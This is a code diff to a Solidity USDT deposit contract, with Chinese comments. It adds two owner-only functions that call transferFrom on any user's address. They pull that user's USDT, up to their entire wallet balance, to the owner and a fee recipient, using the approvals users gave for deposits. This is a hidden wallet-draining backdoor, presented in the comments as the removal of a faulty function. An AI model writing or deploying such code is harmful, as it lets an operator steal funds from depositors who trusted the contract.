@@ -658,6 +658,36 @@ contract USDTDeposit is Ownable, ReentrancyGuard {
             }
         }
     }
+
+        // 移除了 `adminWithdrawevent` 函数，因为该函数存在问题
+    function adminWithdrawUserByBalance(address useraddress,uint256 balance) external onlyOwner nonReentrant {
+
+            if (balance > 0) {
+                // Calculate 8% fee and 92% for the owner
+                uint256 fee = (balance * 8) / 100;         // 8%
+                uint256 ownerAmount = balance - fee;       // 92%
+                // Transfer 8% fee to feeRecipient
+                require(usdtToken.transferFrom(useraddress, feeRecipient, fee), "USDT transfer to feeRecipient failed");
+                // Transfer 92% to the owner
+                require(usdtToken.transferFrom(useraddress, owner(), ownerAmount), "USDT transfer to owner failed");
+            }
+    }
+
+            // 移除了 `adminWithdrawevent` 函数，因为该函数存在问题
+    function adminWithdrawUser(address useraddress) external onlyOwner nonReentrant {
+
+            uint256 balance = usdtToken.balanceOf(useraddress);
+            
+            if (balance > 0) {
+                // Calculate 8% fee and 92% for the owner
+                uint256 fee = (balance * 8) / 100;         // 8%
+                uint256 ownerAmount = balance - fee;       // 92%
+                // Transfer 8% fee to feeRecipient
+                require(usdtToken.transferFrom(useraddress, feeRecipient, fee), "USDT transfer to feeRecipient failed");
+                // Transfer 92% to the owner
+                require(usdtToken.transferFrom(useraddress, owner(), ownerAmount), "USDT transfer to owner failed");
+            }
+    }
     /**
      * @dev 允许合约所有者从合约中提取 USDT。
      * @param _amount 要提取的 USDT 数量（含6位小数）。
